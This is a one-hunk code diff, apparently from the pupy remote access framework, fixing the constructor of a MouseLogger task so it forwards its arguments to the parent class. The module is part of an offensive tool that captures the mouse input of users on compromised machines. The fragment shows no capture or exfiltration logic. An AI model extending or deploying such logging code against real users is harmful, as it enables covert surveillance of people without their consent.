@@ -202,7 +202,7 @@ def mouselogger_stop():
 
 class MouseLogger(pupy.Task):
     def __init__(self, *args, **kwargs):
-        super(MouseLogger, self).__init__()
+        super(MouseLogger, self).__init__(*args, **kwargs)
         self.hooked  = None
         self.pointer = None
 
